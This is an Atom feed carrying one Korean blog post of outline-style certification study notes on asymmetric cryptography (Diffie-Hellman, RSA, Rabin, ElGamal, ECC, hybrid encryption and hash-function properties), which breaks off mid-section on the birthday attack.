<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://bluesplatter.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://bluesplatter.com/" rel="alternate" type="text/html" /><updated>2021-11-19T17:56:23+09:00</updated><id>https://bluesplatter.com/feed.xml</id><title type="html">Bluesplatter</title><subtitle>전문적이지 않은 정보들, 감상, 즉흥적인 내용들</subtitle><author><name>HY03</name><email>hyunik03@gmail.com</email></author><entry><title type="html">정보보안 - 비대칭키 암호</title><link href="https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/" rel="alternate" type="text/html" title="정보보안 - 비대칭키 암호" /><published>2021-08-25T09:00:00+09:00</published><updated>2021-08-25T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/">&lt;h1 id=&quot;비대칭키-암호&quot;&gt;비대칭키 암호&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;키 배송 문제
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;대칭키 암호를 사용하려면 키 배송 문제(key distribution problem) 발생
            &lt;ul&gt;
              &lt;li&gt;암호화 키와 복호화 키가 동일&lt;/li&gt;
              &lt;li&gt;키 배송 중 도청 가능성&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;해결방안
            &lt;ul&gt;
              &lt;li&gt;키의 사전 공유에 의한 해결&lt;/li&gt;
              &lt;li&gt;키배포 센터에 의한 해결&lt;/li&gt;
              &lt;li&gt;Diffie-Hellman 키 교환에 의한 해결&lt;/li&gt;
              &lt;li&gt;공개키 암호에 의한 해결&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;키의 사전 공유에 의한 해결
        &lt;ul&gt;
          &lt;li&gt;안전한 키를 사전에 공유함
            &lt;ul&gt;
              &lt;li&gt;안전한 통로를 이용함
                &lt;ul&gt;
                  &lt;li&gt;Trusted Authority (TA : 키관리기관)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;인원이 많아지면 키가 많아져서 문제&lt;/li&gt;
          &lt;li&gt;n명의 사원이 자신 외의 사람과 통신시 키는 n(n-1)/2 이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;키배포 센터에 의한 해결
        &lt;ul&gt;
          &lt;li&gt;KDC (Key Distribution Center : 온라인 키 분배 - 일종의 TA)&lt;/li&gt;
          &lt;li&gt;암호 통신이 필요해질 때마다 통신용 키를 키배포 센터라는 신뢰받은 3자에 의해 공유&lt;/li&gt;
          &lt;li&gt;과정
            &lt;ul&gt;
              &lt;li&gt;1 : A 가 KDC에 B와 통신을 하겠다고 요청&lt;/li&gt;
              &lt;li&gt;2 : KDC는 DB에서 A의 키와 B의 키를 추출(비밀키)&lt;/li&gt;
              &lt;li&gt;3 : KDC는 A의 키, B의 키를 이용해 세션키를 생성, 각각 비밀키로 암호화함&lt;/li&gt;
              &lt;li&gt;4 : A 에게 A의 키를 이용해 암호화한 세션키를 전달&lt;/li&gt;
              &lt;li&gt;5 : B 에게 B의 키를 이용해 암호화한 세션키를 전달&lt;/li&gt;
              &lt;li&gt;6 : A 는 자신의 개인키를 이용해 세션키를 복호화&lt;/li&gt;
              &lt;li&gt;7 : A 는 세션키를 이용해 전송할 메시지를 암호화하여 B에게 전송&lt;/li&gt;
              &lt;li&gt;8 : B 는 자신의 개인키를 이용해 세션키를 복호화&lt;/li&gt;
              &lt;li&gt;9 : B 는 세션키를 이용해 A에게 전송받은 메시지를 복호화&lt;/li&gt;
              &lt;li&gt;10 : 통신 종료 후 세션키는 폐기&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Diffie-Hellman 키 교환에 의한 해결
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;1976년 공개키 암호방식을 최초로 제안한 휘트필드 디피와 마틴 헬먼이 발명한 알고리즘&lt;/li&gt;
              &lt;li&gt;공개키 암호방식의 개념을 이용하여 두 사용자 간에 공통의 암호화키를 안전하게 공유할 수 있는 방법 제시 (최초의 비밀키 교환 프로토콜)&lt;/li&gt;
              &lt;li&gt;Diffie-Hellman 프로토콜 방법에서는 양쪽 통신 주체가 KDC 없이 대칭 세션키를 생성, 대칭키를 만들기 전에 두 개의 수 p와 g를 선택해야 함. p는 매우 큰 소수로서 300자리가 넘는 십진수&lt;/li&gt;
              &lt;li&gt;키 교환이라는 이름이 붙어있지만 키 교환이 아니라 공유할 키를 계산하여 만들어 내는 것, 때문에 키 합의(Diffie-Hellman key agreement)로 불리기도 함&lt;/li&gt;
              &lt;li&gt;유한체상의 이산대수문제를 풀기 어렵다는 사실이 이를 뒷받침함&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Diffie-Hellman의 안정성
            &lt;ul&gt;
              &lt;li&gt;두 가지 공격에 약점을 보임, 이산대수공격, 중간자 공격&lt;/li&gt;
              &lt;li&gt;이산대수공격
                &lt;ul&gt;
                  &lt;li&gt;키 교환의 안정성을 이산대수문제를 풀기 어렵다는데 기반을 둔다.&lt;/li&gt;
                  &lt;li&gt;Eve가 R1과 R2를 가로챌 수 있으므로 대칭키 K를 계산할 수 있다.
                    &lt;ul&gt;
                      &lt;li&gt;A : R1 (공개값) = g^x mod p&lt;/li&gt;
                      &lt;li&gt;B : R2 (공개값) = g^y mod p&lt;/li&gt;
                      &lt;li&gt;A 는 R1을 B에 전송&lt;/li&gt;
                      &lt;li&gt;B 는 R2을 A에 전송&lt;/li&gt;
                      &lt;li&gt;A : K = R2^x mod p&lt;/li&gt;
                      &lt;li&gt;B : K = R1^y mod p
                        &lt;ul&gt;
                          &lt;li&gt;K = g^xy mod p&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;Eve 가 R1, R2 를 가로채 x,y 를 추출하여 K를 생성할 수 있음&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;x, y값을 추출해내서 더 이상 비밀키가 비밀이 되지 않는다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;중간자 공격(man in the middle attack)
                &lt;ul&gt;
                  &lt;li&gt;키 교환 프로토콜은 인증 단계가 없어서 이런 공격에 취약&lt;/li&gt;
                  &lt;li&gt;공격을 막기 위해 디지털서명과 공개키 인증서 등을 이용하면 됨&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;DoS 공격
                &lt;ul&gt;
                  &lt;li&gt;Diffie-Hellman 은 지수함수에 기초하고 있어 계산이 복잡함&lt;/li&gt;
                  &lt;li&gt;동시에 통신 시 비밀키 생성 시 많은 부하가 걸림&lt;/li&gt;
                  &lt;li&gt;키 생성을 다수 요청하면 서버가 마비됨&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;공개키 암호에 의한 해결
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;대칭키 암호에서 암호화키와 복호화키는 같다. 공개키 암호에서는 이 두개가 다르다.&lt;/li&gt;
              &lt;li&gt;수신자는 미리 암호화키 (공개키) 를 송신자에게 알려준다. Eve 에게 알려져도 괜찮다. 송신자는 암호화키 (공개키) 로 암호화하여 수신자에게 보낸다.&lt;/li&gt;
              &lt;li&gt;복호화는 복호화키 (개인키) 를 가지고 있는 사람(수신자)만 가능하다. 이러면 복호화키를 전달할 필요가 없다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;공개키 암호 (public-key cryptography)
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;대칭키 암호는 평문을 복잡한 형태로 변환해서 기밀성을 유지&lt;/li&gt;
          &lt;li&gt;공개키 암호는 수학적으로 해결하기 곤란한 문제 (소인수분해, 이산대수…) 를 토대로 해서 기밀성을 유지&lt;/li&gt;
          &lt;li&gt;전자문서의 무결성, 전자서명(부인방지) 구현에 활용&lt;/li&gt;
          &lt;li&gt;다양한 암호 프로토콜에 사용&lt;/li&gt;
          &lt;li&gt;공개키 암호에서는 암호화키와 복호화키가 분리되어 있음.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;수학적으로 해결하기 곤란한 문제
        &lt;ul&gt;
          &lt;li&gt;소인수분해 문제
            &lt;ul&gt;
              &lt;li&gt;RSA&lt;/li&gt;
              &lt;li&gt;Rabin&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;이산대수 문제
            &lt;ul&gt;
              &lt;li&gt;ElGamal&lt;/li&gt;
              &lt;li&gt;DSA (DSS)&lt;/li&gt;
              &lt;li&gt;ECC (타원곡선)
                &lt;ul&gt;
                  &lt;li&gt;ECDSA&lt;/li&gt;
                  &lt;li&gt;KCDSA&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;과정
        &lt;ul&gt;
          &lt;li&gt;1 : A가 세션키를 B의 공개키로 암호화&lt;/li&gt;
          &lt;li&gt;2 : A가 암호화된 세션키를 B에 전송&lt;/li&gt;
          &lt;li&gt;3 : B가 B의 개인키로 암호화된 세션키를 복호화
            &lt;ul&gt;
              &lt;li&gt;B의 공개키 / 개인키는 수학적으로 밀접한 관계가 있음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;4 : A 와 B의 키 교환 완료&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;RSA 암호시스템
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;기본 개념
            &lt;ul&gt;
              &lt;li&gt;RSA 는 공개키 암호 알고리즘 중 하나&lt;/li&gt;
              &lt;li&gt;세계적으로 사실상 표준&lt;/li&gt;
              &lt;li&gt;Rivest-Shamir-Adelman 의 첫 글자를 따서 붙여짐&lt;/li&gt;
              &lt;li&gt;인수분해 문제해결의 높은 난이도를 이용한 가장 대표적인 공개키 암호 알고리즘&lt;/li&gt;
              &lt;li&gt;디지털 서명의 용도로도 사용됨&lt;/li&gt;
              &lt;li&gt;SSL 프로토콜을 가진 웹 브라우저, PGP, 공개키 암호시스템을 사용하는 정부 시스템 등에서 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;암호화와 복호화
            &lt;ul&gt;
              &lt;li&gt;RSA는 e와 d 두 지수를 사용
                &lt;ul&gt;
                  &lt;li&gt;A (송신자) : C = P^e mod n&lt;/li&gt;
                  &lt;li&gt;B (수신자) : P = C^d mod n
                    &lt;ul&gt;
                      &lt;li&gt;e : 공개하는 값&lt;/li&gt;
                      &lt;li&gt;d : 비밀로 유지하는 값&lt;/li&gt;
                      &lt;li&gt;P : 평문&lt;/li&gt;
                      &lt;li&gt;C : 암호문&lt;/li&gt;
                      &lt;li&gt;n : 매우 큰 수&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;RSA 에 대한 공격
            &lt;ul&gt;
              &lt;li&gt;소인수분해 공격
                &lt;ul&gt;
                  &lt;li&gt;RSA 는 모듈러 값이 매우 커서 이 값을 적절한 시간 내에 소인수분해 하는 것이 불가능&lt;/li&gt;
                  &lt;li&gt;B (수신자) 은 p와 q 를 선택하고 n = p * q 를 계산
                    &lt;ul&gt;
                      &lt;li&gt;n은 공개되지만 p와 q 는 비밀임&lt;/li&gt;
                      &lt;li&gt;Eve가 n을 소인수분해하여 p와 q를 구할 수 있다면 Pi(N) 을 구할 수 있음&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;소인수분해 알고리즘 (Factoring Attack) 이 개발되지 않는다면 RSA는 안전하다고 할 수 있음&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;중간자 공격
                &lt;ul&gt;
                  &lt;li&gt;중간자 공격은 기밀성에 매우 유효한 공격 방법&lt;/li&gt;
                  &lt;li&gt;적극적 공격자 멜로리가 송신자와 수신자 사이에 들어가서 송신자에 대해서는 수신자처럼, 수신자에 대해서는 송신자처럼 행세하는 공격&lt;/li&gt;
                  &lt;li&gt;중간자 공격을 막기 위해서는 입수한 공개키가 밥의 것이라는 것을 확인할 수단인 인증이 필요하다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Rabin 암호시스템
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;M.Rabin 이 고안, RSA 암호시스템의 변형&lt;/li&gt;
          &lt;li&gt;RSA는 지수 합동, Rabin은 2차 합동에 근거&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;암호화와 복호화
        &lt;ul&gt;
          &lt;li&gt;Rabin 암호시스템에서 암호화는 매우 간단, 한 번의 곱셈으로 이루어짐&lt;/li&gt;
          &lt;li&gt;성능이 낮은 플랫폼에서 잘 활용됨 (스마트 카드 등)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Rabin 시스템의 보안
        &lt;ul&gt;
          &lt;li&gt;p와 q 가 충분히 크기만 하면 안전 (mod N을 구하는 것이 어려움)&lt;/li&gt;
          &lt;li&gt;RSA 만큼 안전&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ElGamal 방식
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;Taher ElGamal 이 발명&lt;/li&gt;
          &lt;li&gt;이산대수 문제에 근거해서 만든 시스템 (오픈 소스를 기초, 키 분배 방식 및 공개키 암호 방식 실현)&lt;/li&gt;
          &lt;li&gt;디지털 서명, 암호화, 키교환&lt;/li&gt;
          &lt;li&gt;Diffie-Hellman 암호화 기능의 확장, 속도가 느림&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;암호화와 복호화
        &lt;ul&gt;
          &lt;li&gt;Bob의 공개키를 이용해 누구든 Bob에게 메시지를 보낼 수 있음&lt;/li&gt;
          &lt;li&gt;고속 지수 알고리즘을 사용하면 다항식 정도의 복잡도를 가지는 시간 내에 수행 가능&lt;/li&gt;
          &lt;li&gt;암호화에서는 암호문의 길이가 평문의 2배가 되어 버린다는 결점&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;응용
        &lt;ul&gt;
          &lt;li&gt;RSA 를 활용할 수 있는 곳에는 어디에서나 사용 가능&lt;/li&gt;
          &lt;li&gt;키 교환, 인증, 짧은 메시지의 암호화와 복호화에 사용&lt;/li&gt;
          &lt;li&gt;암호 소프트웨어 GnuPG에 구현되어 있음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;타원곡선 암호 (ECC, elliptic curve cryptosystem)
    &lt;ul&gt;
      &lt;li&gt;등장배경
        &lt;ul&gt;
          &lt;li&gt;RSA 와 ElGamal 이 안전한 비대칭키 암호시스템이기는 하지만 보안을 위해서 키의 길이가 매우 커야한다는 단점이 있음&lt;/li&gt;
          &lt;li&gt;따라서 키의 길이가 짧아도 되는 암호시스템을 연구 -&amp;gt; ECC&lt;/li&gt;
          &lt;li&gt;타원곡선 이론에 근거&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;특징
        &lt;ul&gt;
          &lt;li&gt;유한체 위에서 정의된 타원곡선 군에서의 이산대수 문제에 기초한 공개키 알고리즘&lt;/li&gt;
          &lt;li&gt;RSA 암호방식에 이어 전자상거래의 핵심 기술로 주목&lt;/li&gt;
          &lt;li&gt;1985년 코블리치(N.Koblitz) 와 밀러(V.S.Miller)가 RSA 암호방식의 대안으로 처음 제안&lt;/li&gt;
          &lt;li&gt;RSA보다 키의 비트 수를 적게 하면서도 동일한 성능을 제공하는 것이 특징
            &lt;ul&gt;
              &lt;li&gt;160비트 ECC는 1024비트 RSA 키와 동일한 보안수준&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;다양한 암호방식 설계가 용이
            &lt;ul&gt;
              &lt;li&gt;H/W 와 S/W 로 구현하기 용이&lt;/li&gt;
              &lt;li&gt;스마트카드나 무선통신단말기 등과 같이 메모리 처리능력이 제한된 응용 분야에 특히 효율적&lt;/li&gt;
              &lt;li&gt;전자상거래의 핵심&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;ECC 는 RSA 보다 상대적으로 지명도가 부족, 배경이론이 복잡하며 해당 분야의 전문가가 적다는 단점이 있음&lt;/li&gt;
          &lt;li&gt;빠른 속도로 구현이 가능&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ECC 와 RSA 방식 비교&lt;/p&gt;

        &lt;table&gt;
          &lt;thead&gt;
            &lt;tr&gt;
              &lt;th style=&quot;text-align: left&quot;&gt;항목&lt;/th&gt;
              &lt;th style=&quot;text-align: left&quot;&gt;ECC 방식&lt;/th&gt;
              &lt;th style=&quot;text-align: left&quot;&gt;RSA 방식&lt;/th&gt;
            &lt;/tr&gt;
          &lt;/thead&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;기반구조&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;WPKI(무선)&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;PKI(유선)&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;속도&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;우수&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;느림&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;키 크기&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;상대적으로 작은 키&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;ECC에 비해 큰 키&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;적용&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;소형 Mobile환경&lt;/td&gt;
              &lt;td style=&quot;text-align: left&quot;&gt;인프라가 다소 구현된 환경&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;하이브리드 암호시스템
    &lt;ul&gt;
      &lt;li&gt;대칭키 암호와 공개키 암호
        &lt;ul&gt;
          &lt;li&gt;대칭키 암호 특징
            &lt;ul&gt;
              &lt;li&gt;장점 : 대칭키 암호를 사용하면 기밀성을 유지한 통신이 가능&lt;/li&gt;
              &lt;li&gt;단점(a) : 키 배송 문제가 발생&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;공개키 암호 특징
            &lt;ul&gt;
              &lt;li&gt;장점 : 키를 배송할 필요가 없음&lt;/li&gt;
              &lt;li&gt;단점(a) : 대칭키 암호에 비해 처리속도가 느림&lt;/li&gt;
              &lt;li&gt;단점(b) : 중간자 공격에 약함&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;하이브리드 암호 시스템은 이 중 (a)의 문제를 해결하기 위한 방법&lt;/li&gt;
          &lt;li&gt;(b)를 해결하려면 인증이 필요&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;대칭키 암호와 공개키 암호의 장점을 살릴 수 있도록 조합한 방법&lt;/li&gt;
          &lt;li&gt;메시지를 고속의 대칭키 암호로 암호화함&lt;/li&gt;
          &lt;li&gt;대칭키 암호의 키 기밀성을 위해 공개키 암호를 사용
            &lt;ul&gt;
              &lt;li&gt;메시지 암호화에 사용한 대칭키 암호키를 공개키 암호로 암호화&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;과정
        &lt;ul&gt;
          &lt;li&gt;암호화
            &lt;ul&gt;
              &lt;li&gt;PRNG(의사난수 생성기)를 이용해 K(세션키) 생성&lt;/li&gt;
              &lt;li&gt;K 를 수신자의 Kpub(공개키)를 이용해 C1(암호문) 생성&lt;/li&gt;
              &lt;li&gt;P(평문) 는 K(세션키) 를 이용해 암호화(C2)&lt;/li&gt;
              &lt;li&gt;C1 과 C2를 결합 =&amp;gt; 하이브리드 시스템 암호문&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;복호화
            &lt;ul&gt;
              &lt;li&gt;하이브리드 시스템 암호문 =&amp;gt; C1 과 C2 를 분리
                &lt;ul&gt;
                  &lt;li&gt;C1 : 세션키 암호&lt;/li&gt;
                  &lt;li&gt;C2 : 메시지 암호&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;C1 은 수신자의 Kpri(개인키)를 이용해 평문 K(세션키) 를 추출&lt;/li&gt;
              &lt;li&gt;C2 은 K(세션키) 를 이용해 평문 P(메시지) 를 추출&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;하이브리드 암호 시스템의 예
        &lt;ul&gt;
          &lt;li&gt;공개키 암호의 처리 속도가 느린 것을 대칭키 암호로 해결, 대칭키 암호의 키 배송 문제를 공개키 암호로 해결&lt;/li&gt;
          &lt;li&gt;유명한 암호 소프트웨어인 PGP 와 Web의 암호통신에 사용되고 있는 SSL/TLS 에서도 하이브리드 암호시스템 사용&lt;/li&gt;
          &lt;li&gt;PGP의 처리에서는 하이브리드 암호시스템에 디지털서명, 디지털서명의 검증, 개인키의 관리도 추가하여 사용됨.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;해시함수
    &lt;ul&gt;
      &lt;li&gt;일방향 해시함수
        &lt;ul&gt;
          &lt;li&gt;일방향 해시함수의 개요
            &lt;ul&gt;
              &lt;li&gt;기본개념
                &lt;ul&gt;
                  &lt;li&gt;일방향 해시함수(one-way hash function) 에는 입력과 출력이 각각 1개씩 있음&lt;/li&gt;
                  &lt;li&gt;입력은 메시지(message) - 임의의 길이, 출력은 해시값(hash value) - 고정된 길이&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;일방향 해시함수의 성질
            &lt;ul&gt;
              &lt;li&gt;임의 길이의 메시지로부터 고정 길이의 해시값을 계산&lt;/li&gt;
              &lt;li&gt;해시값을 고속으로 계산&lt;/li&gt;
              &lt;li&gt;일방향성을 가짐. (해시값으로부터 메시지를 역산할 수 없음)&lt;/li&gt;
              &lt;li&gt;메시지가 다르면 해시값도 다름. (무결성 확인용)
                &lt;ul&gt;
                  &lt;li&gt;메시지가 1비트라도 변하면 해시값은 매우 높은 확률로 다른 값이 되야 함.&lt;/li&gt;
                  &lt;li&gt;2개의 다른 메시지가 같은 해시값을 갖는 것을 충돌(collision) 이라고 함.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;충돌이 발생하는 것이 어려운 성질 =&amp;gt; 충돌 내성 (collision resistance)&lt;/li&gt;
              &lt;li&gt;해시 함수 = 메시지 다이제스트 함수 = 메시지 요약함수&lt;/li&gt;
              &lt;li&gt;무결성 = 완전성 = 보전성&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;메시지 무결성
        &lt;ul&gt;
          &lt;li&gt;무결성 점검
            &lt;ul&gt;
              &lt;li&gt;무결성 점검을 위해 암호학적 해시함수 사용&lt;/li&gt;
              &lt;li&gt;생성된 메시지 다이제스트와 이전 메시지 다이제스트를 비교&lt;/li&gt;
              &lt;li&gt;두 개가 동일하면 원래 메시지가 변경되지 않음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;암호학적 해시함수 기준
            &lt;ul&gt;
              &lt;li&gt;개요 (암호학적 해시함수는 다음을 충족해야 함)
                &lt;ul&gt;
                  &lt;li&gt;프리이미지 저항성 (preimage resistance) : &lt;strong&gt;역상 저항성&lt;/strong&gt;
                    &lt;ul&gt;
                      &lt;li&gt;해시함수 h 와 y=h(M) 에 대하여 Eve 가 이를 만족하는 M 값을 찾아내는게 힘들어야 함&lt;/li&gt;
                      &lt;li&gt;&lt;strong&gt;y = h(x) 를 만족하는 x 를 찾는 것이 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;제2프리이미지 저항성 (second preimage resistance) : 두 번째 역상 저항성, &lt;strong&gt;약한 충돌 내성&lt;/strong&gt;
                    &lt;ul&gt;
                      &lt;li&gt;메시지를 쉽게 위조할 수 없도록 하는 성질&lt;/li&gt;
                      &lt;li&gt;Eve가 메시지와 다이제스트를 가로채고 또 다른 다이제스트를 생성&lt;/li&gt;
                      &lt;li&gt;&lt;strong&gt;입력값 x에 대해서 h(x) = h(x’), x != x’ 을 만족하는 x’ 을 찾는 것이 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;충돌 저항성 (collision resistance) : &lt;strong&gt;강한 충돌 내성&lt;/strong&gt;
                    &lt;ul&gt;
                      &lt;li&gt;약한 충돌 내성보다 확률이 높음&lt;/li&gt;
                      &lt;li&gt;Eve 로 하여금 동일한 다이제스트를 가지는 2개의 메시지를 구하지 못하도록 하는 것&lt;/li&gt;
                      &lt;li&gt;&lt;strong&gt;h(x) = h(x’) 을 만족하는 입력값 x, x’ 을 찾는다는 것은 계산적으로 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;일방향 해시함수의 응용
        &lt;ul&gt;
          &lt;li&gt;소프트웨어 변경 검출&lt;/li&gt;
          &lt;li&gt;패스워드를 기초로 한 암호화
            &lt;ul&gt;
              &lt;li&gt;패스워드와 솔트(의사난수 랜덤 값)를 섞은 결과의 해시값을 구해 그것을 암호화키로 사용 =&amp;gt; 사전 공격 차단&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;메시지 인증코드
            &lt;ul&gt;
              &lt;li&gt;송신자와 수신자만의 키와 메시지를 혼합하여 해시값을 계산 한 것&lt;/li&gt;
              &lt;li&gt;SSL/TLS 에서도 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;전자서명&lt;/li&gt;
          &lt;li&gt;전자입찰 시스템&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;랜덤 오라클 모델과 해시함수에 대한 공격
        &lt;ul&gt;
          &lt;li&gt;랜덤 오라클 모델
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;해시함수에 대한 이상적인 수학적 모델&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;비둘기집 원리
                &lt;ul&gt;
                  &lt;li&gt;n+1 비들기가 n개의 집에 들어가 있을 때 한 비둘기 집에는 두마리가 있다는 원리 (충돌을 의미)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;생일 문제 (생일 공격)
                &lt;ul&gt;
                  &lt;li&gt;같은 해시값을 생성하는 2개의 메시지를 구하는 것&lt;/li&gt;
                  &lt;li&gt;강한 충돌 내성을 깨고자 하는 공격&lt;/li&gt;
                  &lt;li&gt;생일 패러독스 (birthday paradox) -&amp;gt; 일치할 확률이 상상 이상으로 높아지는 것&lt;/li&gt;
                  &lt;li&gt;랜덤으로 선택한 N명의 그룹, N 명 중 적어도 2명의 생일이 일치할 확률이 1/2 이상이 되도록 하기 위한 N은 최저 몇 명? -&amp;gt; 23명
                    &lt;ul&gt;
                      &lt;li&gt;N명 전원 생일이 일치하지 않을 확률을 1에서 빼면 됨.&lt;/li&gt;
                    &lt;/ul&gt;
